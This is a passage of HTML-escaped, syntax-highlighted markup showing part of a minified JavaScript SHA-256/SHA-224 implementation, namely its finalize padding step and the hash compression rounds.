class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">bytes&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">bytes&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">4294967296&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="k">return&lt;/span> &lt;span class="k">this&lt;/span>&lt;span class="p">};&lt;/span>&lt;span class="nx">Sha256&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">prototype&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">finalize&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kd">function&lt;/span>&lt;span class="p">(){&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">finalized&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="k">return&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">finalized&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">blocks&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">lastByteIndex&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">block&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">|=&lt;/span>&lt;span class="nx">EXTRA&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">block&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">&amp;gt;=&lt;/span>&lt;span class="mi">56&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">hashed&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">hash&lt;/span>&lt;span class="p">()}&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">block&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">6&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">7&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">9&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">11&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">13&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">14&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">15&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">14&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">hBytes&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">bytes&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">29&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">15&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">bytes&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">hash&lt;/span>&lt;span class="p">()};&lt;/span>&lt;span class="nx">Sha256&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">prototype&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">hash&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kd">function&lt;/span>&lt;span class="p">(){&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">a&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h2&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h3&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h4&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h5&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">g&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h6&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">h&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h7&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">s0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">s1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">maj&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">t1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">t2&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">ch&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">ab&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">da&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">cd&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">bc&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">for&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="mi">64&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">t1&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">15&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="nx">s0&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">t1&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">7&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">t1&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">25&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">t1&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">18&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">t1&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">14&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">t1&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="nx">t1&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="nx">s1&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">t1&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">17&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">t1&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">15&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">t1&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">19&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">t1&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">13&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">t1&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">s0&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">7&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">s1&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="nx">bc&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">for&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="mi">64&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="o">+=&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">first&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">is224&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">ab&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">300032&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">t1&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1413257819&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">h&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">t1&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">150054599&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">t1&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">24177077&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="k">else&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">ab&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">704751109&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">t1&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">210244248&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">h&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">t1&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1521486534&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">t1&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">143694565&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">first&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">false&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="k">else&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">s0&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">30&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">13&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">19&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">22&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="p">));&lt;/span>&lt;span class="nx">s1&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">6&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">26&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">11&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">21&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">25&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">7&lt;/span>&lt;span class="p">));&lt;/span>&lt;span class="nx">ab&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">maj&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">ab&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="nx">bc&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">ch&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">~&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">g&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="nx">t1&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">h&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">s1&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">ch&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">K&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="nx">t2&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">s0&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">maj&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">h&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">t1&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">t1&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">t2&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="nx">s0&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">30&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">13&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">19&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">22&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="p">));&lt;/span>&lt;span class="nx">s1&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">h&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">6&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">h&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">26&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">h&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">11&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">h&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">21&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">h&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&amp;gt;&lt;/span>&lt;span class="mi">25&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">h&lt;/span>&lt;span class="o">&amp;lt;&amp;lt;&lt;/span>&lt;span class="mi">7&lt;/span>&lt;span class="p">));&lt;/span>&lt;span class="nx">da&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">maj&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">da&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="nx">ab&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">ch&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">h&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">^&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">~&lt;/span>&lt;span class="nx">h&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="nx">t1&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">g&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">s1&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">ch&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">K&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="nx">t2&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">s0&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">maj&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">g&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nx">t1&lt;/span>&lt;span 